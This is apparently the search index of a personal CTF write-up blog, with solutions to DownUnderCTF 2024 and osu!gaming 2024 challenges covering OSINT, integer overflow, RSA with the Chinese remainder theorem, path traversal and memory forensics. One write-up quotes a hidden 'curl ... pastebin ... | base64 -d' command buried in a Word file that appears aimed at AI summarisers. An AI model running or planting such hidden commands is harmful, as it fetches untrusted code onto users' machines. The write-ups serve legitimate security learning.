
[{"content":"Challenge Description: Did MC Fat Monke just drop a new track????? ðŸ‘€ðŸ‘€ðŸ‘€\nSolving Process: This was a straight forward solve, though since it has great audio I thought to include it here\nSearching for MC Fat Monke on YouTube led to the below video\nAfter jamming out a few times, there is a frame in the video that holds what seems like a valid URL https://average-primate-th.wixsite.com/mc-fat-monke-appreci\nFlag:DUCTF{wIr_G0iNg_b4K_t00_d3r_jUNgL3_mIt_d15_1!!111!}\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/back-to-the-jungle/","section":"Writeups","summary":"Challenge Description: Did MC Fat Monke just drop a new track?","title":"back to the jungle","type":"writeups"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":"DownUnderCTF is a world-wide Capture The Flag (CTF) competition targeted at Australian and New Zealand secondary and tertiary students.\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/","section":"Writeups","summary":"DownUnderCTF is a world-wide Capture The Flag (CTF) competition targeted at Australian and New Zealand secondary and tertiary students.","title":"DUCTF2024","type":"writeups"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/","section":"izrid.github.io","summary":"","title":"izrid.github.io","type":"page"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"Challenge Description: Mash your keyboard numpad in a specific order and a flag might just pop out!\nSolving Process: We\u0026rsquo;re given an address to use netcat with, along with a binary file. If we use netcat straight away, we see that we\u0026rsquo;re asked for some numbers\nMashing some random numbers in we get told Nope! and the connection closes. Maybe we should check out that binary file.\nOpening it up in Ghidra, we\u0026rsquo;ll go to the main function to see what\u0026rsquo;s happening\nImmediately we can see that we\u0026rsquo;re expected to input two numbers, which are saved as local_11c and local_118. From there, if the first number is 0 or the second number is either 0 or 1 the interaction will end. We see address local_114 initialised with a value of 0, followed by an if block. If the second number we put in isn\u0026rsquo;t 0, local_114 will equal our first input number divided by the second input number. The next if block compares local_114 against local_11c (our first input number) and if they\u0026rsquo;re not the same, exit. If they are the same, we\u0026rsquo;ll get to the flag at the bottom.\nSo how are we meant to find two numbers, where the first ins\u0026rsquo;t 0 and the second isn\u0026rsquo;t 0 or 1, that when divided by each other, will equal the first number?\nBreak math!\nSpecifically, we see that we\u0026rsquo;re dealing with int values and know that given a large enough number, it\u0026rsquo;ll wrap around to its negative value (normally called integer overlow)\nRather than spamming nc requests with my guesses, I wrote some basic C to play with values until we got the right ones\nGiven that we want to force an overflow and we\u0026rsquo;re dealing with int, let\u0026rsquo;s play with some values around 2147483648 and -1 for our second number\nFlag:DUCTF{w0w_y0u_just_br0ke_math!!}\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/number-mashing/","section":"Writeups","summary":"Challenge Description: Mash your keyboard numpad in a specific order and a flag might just pop out!","title":"number mashing","type":"writeups"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/tags/rev/","section":"Tags","summary":"","title":"Rev","type":"tags"},{"content":"Challenge Description: Everybody, Sunzi\u0026rsquo;s math class is about to begin!!!\nSolving Process: We\u0026rsquo;re given a URL to visit, which explains the challenge in more detail. I\u0026rsquo;ll include a screenshot of the site as it may be down if you\u0026rsquo;re reading this later\nPaying attention to the part that Han Xin\u0026rsquo;s steward said, where When the soldiers stand 3 in a row, there are 2 soldiers left over. When they line up 5 in a row, there are 4 soldiers left over. When they line up 7 in a row, there are 5 soldiers left over. Seems as though this could be some math, where we need to find a value that within 1000 and 1100, will satisfy the above. In other words, find i such that i % 3 == 2 \u0026amp;\u0026amp; i % 5 == 4 \u0026amp;\u0026amp; i % 7 == 5\nWriting this in a language of your choice is pretty straight forward. I used Java and used a loop to see what the result is, which turns out to be 1034\nUsing the number above for the answer, we get more revealed\nDoing some light reading on Chinese Remainder Theory, we can use the values above to find m with some Python\nfrom sympy import * c1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637 c2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737 c3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659 n1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693 n2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403 n3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817 N = n1 * n2 * n3 N1 = N // n1 N2 = N // n2 N3 = N // n3 M1 = mod_inverse(N1, n1) M2 = mod_inverse(N2, n2) M3 = mod_inverse(N3, n3) x = (c1 * N1 * M1 + c2 * N2 * M2 + c3 * N3 * M3) % N m = integer_nthroot(x, 3) print(m) This will print out 11564025922867522871782912815123211630478650327759091593792994457296772521676766420142199669845768991886967888274582504750347133 which when entered in the answer field gives us the flag!\nFlag:DUCTF{btw_y0u_c4n_als0_us3_CRT_f0r_p4rt14l_fr4ct10ns}\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/sun-zis-perfect-math-class/","section":"Writeups","summary":"Challenge Description: Everybody, Sunzi\u0026rsquo;s math class is about to begin!","title":"Sun Zi's Perfect Math Class","type":"writeups"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"Challenge Description: I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?\nSolving Process: We\u0026rsquo;re given a file labelled EmuWar.docx to download. If we try to use less we\u0026rsquo;re told that it may be a binary file, which seems a bit odd\nLet\u0026rsquo;s use xxd combined with head to get the magic numbers of the file to see if the file is actually something else. Looking at the output below and checking Wikipedia, we can see that it\u0026rsquo;s actually a zipped file!\nUsing unzip EmuWar.docx we\u0026rsquo;re given a couple of folders and a few files. I went straight to word/document.xml and saw what I assumed was a good story (it was too long, so I didn\u0026rsquo;t read). Buried inside were some commands however, specifically curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d. What happends if we run it?\nFlag:DUCTF{chatgpt_I_n33d_2_3scap3}\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/tldr-please-summarise/","section":"Writeups","summary":"Challenge Description: I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again.","title":"tldr please summarise","type":"writeups"},{"content":"Challenge Description: Our Cyber Chef has been creating some wacky recipes recently, though he has been rather protective of his secret ingredients. Use this Chicken Parmi recipe and decipher the missing values to discover the chef\u0026rsquo;s secret ingredient!\nSolving Process: We\u0026rsquo;re given a .txt file that contains\u0026hellip;a recipe?\nChicken Parmi. Our Cyber Chef has been creating some wacky recipes recently, though he has been rather protective of his secret ingredients. Use this Chicken Parmi recipe and decipher the missing values to discover the chef\u0026#39;s secret ingredient! This recipe produces the flag in flag format. Ingredients. ?? dashes pain ?? cups effort 1 cup water 4 kg bread crumbs 26 ml hot canola oil 13 kg egg yolks 24 teaspoons all purpose spices 7 teaspoons herbs 26 kg flour 26 kg sliced chicken breasts 1 dashes salt 11 dashes pepper 7 dashes pride and joy 10 kg tomato sauce 14 g cheese 13 kg ham 2 g pasta sauce 6 dashes chilli flakes 5 kg onion 9 dashes basil 19 dashes oregano 10 dashes parsley 20 teaspoons sugar Cooking time: 25 minutes. Pre-heat oven to 180 degrees Celsius. Method. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove bread crumbs from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add hot canola oil to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove egg yolks from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove all purpose spices from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add herbs to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add flour to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove sliced chicken breasts from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove salt from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add pepper to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove pride and joy from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add tomato sauce to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove cheese from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove ham from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Combine pain into 1st mixing bowl. Add pasta sauce to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove chilli flakes from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Remove onion from 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add basil to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Combine pain into 1st mixing bowl. Add oregano to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Add water to 1st mixing bowl. Combine pain into 1st mixing bowl. Add parsley to 1st mixing bowl. Add effort to 1st mixing bowl. Put water into 1st mixing bowl. Combine pain into 1st mixing bowl. Add sugar to 1st mixing bowl. Add effort to 1st mixing bowl. Liquefy contents of the mixing bowl. Pour contents of the mixing bowl into the 1st baking dish. Refrigerate for 1 hour. Someone cooked here. Specifically with the esoteric language Chef\nWe can find a online editor that not only allows us to run the code but to also visualise what\u0026rsquo;s going on. Giving the ingredients pain and effort a value so it all compiles and after doing some reading, we see that there is meant to be some output\nAfter re-reading the documents, it appears as though the bowl values need to line up to ASCII values, with the last value in the bowl being printed first. Through some trial and error, we can somewhat quickly see what values pain and effort need to be to start making this happen\nFlag:DUCTF{2tsp_Vegemite}\n","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/ductf2024/wacky-recipe/","section":"Writeups","summary":"Challenge Description: Our Cyber Chef has been creating some wacky recipes recently, though he has been rather protective of his secret ingredients.","title":"Wacky Recipe","type":"writeups"},{"content":"","date":"21 July 2024","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"","date":"21 June 2024","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":"","date":"21 June 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"21 June 2024","externalUrl":null,"permalink":"/tags/tag/","section":"Tags","summary":"","title":"Tag","type":"tags"},{"content":"an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\n","date":"21 June 2024","externalUrl":null,"permalink":"/posts/test-post-please-ignore/","section":"Posts","summary":"an example to get you started","title":"Test Post Please Ignore","type":"posts"},{"content":"an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\n","date":"21 June 2024","externalUrl":null,"permalink":"/writeups/test-writeup-please-ignore/","section":"Writeups","summary":"an example to get you started","title":"Test Writeup Please Ignore","type":"writeups"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"Challenge Description: miku \u0026lt;3\nSolving Process: We\u0026rsquo;re giving a website to visit (epilepsy warning) (https://mikufanpage.web.osugaming.lol/) as well as a ZIP file which when extracted, shows the structure of the website, as well as all the source code used. There is a app.js file, then two directories called img and public. Inside of the img directory are several .jpg and png files as well as flag.txt (unfortunately this txt file just contains a dummy flag for illustration purposes). The public directory has an index.html file and some other miscellaneous files.\nIt\u0026rsquo;s immediately clear that we\u0026rsquo;ll be paying attention to the img directory to retrieve that flag\nA quick perview of index.html doesn\u0026rsquo;t reveal anything immediately interesting, so we head to app.js and quickly observe that we\u0026rsquo;re going to have to do some directory traversal shenanigans\nTo explain what\u0026rsquo;s happening, our if conditional checks the query parameters of the request and splits the string as soon as it encounters a \u0026quot;.\u0026quot;. Then, immediately after checks whether the proceeding input matches png or jpg. If this is true, then request will be sent to the img directory and allowed to continue. Basically it\u0026rsquo;s a ineffective way to make sure the request is an image only (as confirmed by the comments at the end)\nTo get around this, we can ensure we meet the conditional by having .png or .jpg at the start of our request and then try to traverse out of the img directory (as that\u0026rsquo;s where we\u0026rsquo;ll be sent to), then back in to the directory and access the coveted flag.txt\nFlag:osu{miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku_miku}\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/mikufanpage/","section":"Writeups","summary":"Challenge Description: miku \u0026lt;3","title":"mikufanpage","type":"writeups"},{"content":"Challenge Description: Here\u0026rsquo;s an old screenshot of chat logs between sahuang and Nathan on hollow\u0026rsquo;s Windows machine, but a crucial part of the conversation seems to be cropped out\u0026hellip; Can you help to recover the flag from the future?\nSolving Process: We\u0026rsquo;re given a zip file that contains a cropped PNG image. Around March 2023, news circulated about the \u0026ldquo;aCropalypse\u0026rdquo; - an exploit in screenshot editing tool on the Google Pixel and later discovered to exist on Windows 10 and 11 ( CVE 2023-21036 and CVE 2023-28303 )\nMindful of this, I immediately searched for any online tools that demonstrate this and came accross Acropalypse, however I had mixed success. Instead of giving a native screen resolution, I tried to give a resolution that should have been enough to reveal the rest of the sentence for the flag (the cropped screenshot dimensions were Width: 1047 Height: 246). This didn\u0026rsquo;t generate a proper image on the website, though if I downloaded the image I received an indication I was on the right track\nI could see some distinct Windows elements like the taskbar, so I was confident to keep continuing in this direction and discovered an Acropalypse Restoration tool that should aid us. After getting the tool up and running, we run into the issue of the tool not running at all as the dimensions I\u0026rsquo;m trying might not be correct. Given that the width of the cropped image in 1047, what happens if we try common screen resolutions that exceed that, say 1920 x 1080?\nFlag: osu{cr0pp3d_Future_Candy\u0026lt;3}\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/nathan-on-osu/","section":"Writeups","summary":"Challenge Description: Here\u0026rsquo;s an old screenshot of chat logs between sahuang and Nathan on hollow\u0026rsquo;s Windows machine, but a crucial part of the conversation seems to be cropped out\u0026hellip; Can you help to recover the flag from the future?","title":"nathan-on-osu","type":"writeups"},{"content":"osu! is a fast-paced, precision-oriented rhythm game where players click, slide, and spin their way through difficult beatmaps. In this CTF, they\u0026rsquo;ve combined the culture and community of osu! with that of a regular CTF\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/","section":"Writeups","summary":"osu! is a fast-paced, precision-oriented rhythm game where players click, slide, and spin their way through difficult beatmaps.","title":"osu!2024","type":"writeups"},{"content":"Challenge Description: I love playing this map but recently I noticed that some of the circles seem off. Can you help me find the locations of the weird circles?\nSolving Process: After downloading the provided ZIP file, it appears to contain a beatmap folder that can be used in osu! itself (I don\u0026rsquo;t play, so please excuse any incorrect terminology used), so I spent a lot of time messing around with the in-game editor in osu! to see if there was something further to glean.\nAfter reaching out for a little help, the process to solve this was much easier than I thought. We can observe from the screenshot below that one of the files provided has a different modification date compared to the others.\nWe can check the difference of the modified file and another, untouched file\nAfter spending time investigating modifying beatmap files, I partially understood what we were looking at. These lines appeared to be the hit object syntax which follows as: x coordinate, y coordinate, time, type, hitSound, objectParams, hitSample (thanks to this wiki explaining in depth ), which is cool and all, though not super important. The first four values of each line appear as integers, perhaps representing another value? ASCII always seems popular\nFlag: osu{BTMC_15_mY_G0aT}\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/out-of-click/","section":"Writeups","summary":"Challenge Description: I love playing this map but recently I noticed that some of the circles seem off.","title":"out-of-click","type":"writeups"},{"content":"Challenge Description: Hey osu players, our SOC team was informed that a group of spies from Mai Corp is trying to sabotage our infrastructure via their secret map in osu!.\nWe were able to break into their rendezvous, but they noticed we were stealing their data and they corrupted them in time. Fortunately, we managed to acquire a full memory dump from one of their machines.\nCan you help us investigate what they were trying to do?\nSolving Process: When I see something involving a memory dump, my immediate thought is to turn to Volatility and for this challenge I made use of Volatility 3 specifically.\nAfter downloading the provided ZIP file and extracting it, I used windows.pstree as I (naively) assumed we\u0026rsquo;d be dealing with a Windows memory dump. If this didn\u0026rsquo;t work, we could determine the profile of the image by using windows.info. I\u0026rsquo;ll note that I did use windows.pslist first to list running processes at the time of the memory capture, however there wasn\u0026rsquo;t much that I observed and as such will omit it from here.\nViewing this shorter output we can see that osu!.exe has been spawned, as well as notepad.exe twice. Being that the theme of this challenge is sabotage and my limited hyper-learning surrounding osu!, I figured it\u0026rsquo;d be worthwhile to see if there were any commands recently exectued that seemed suspicious. To do this, I used windows.cmdline and I specifically looked for anything relating to notepad.exe or osu!.exe itself.\nImmediately on the right hand side of the two .osu files, the string X3NlZWVlZWVlZWVla30= stands out as a strong candidate as being Base64 encoded. We can immediately test this using base64, which is native to most Linux distributions.\nThose of you more observant might notice that there is still more yet to take from our windows.cmdline output from earlier. Unfortunately I skimmed over the rest of the file and spent too much time delving into rabbit holes. I eventually circled back to our two lines of output from windows.cmdline and looked a little closer. Is this Hexademical?\nFinally we (or rather I) observe the start of the flag in the filename and combine all parts together\nFlag: osu{hide_n_seeeeeeeeeek}\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/volatile-map/","section":"Writeups","summary":"Challenge Description: Hey osu players, our SOC team was informed that a group of spies from Mai Corp is trying to sabotage our infrastructure via their secret map in osu!","title":"volatile-map","type":"writeups"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"Challenge Description: welcome to web! there\u0026rsquo;s a flag somewhere on my osu! profile\u0026hellip;\nSolving Process: We\u0026rsquo;re given this url to investigate https://osu.ppy.sh/users/11118671 . Nothing to see on the surface, what about when we look deeper, perhaps the source? What happens when we try a cheeky ctrl + f to find our flag?\nThat\u0026rsquo;s a lot of flags. Feels like our real flag is buried here somewhere. Since we\u0026rsquo;re thinking buried, let\u0026rsquo;s start from the last search result\nFlag: osu{ok_u_see_me}\n","date":"9 March 2024","externalUrl":null,"permalink":"/writeups/osu2024/when-you-dont-see-it/","section":"Writeups","summary":"Challenge Description: welcome to web!","title":"when-you-dont-see-it","type":"writeups"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]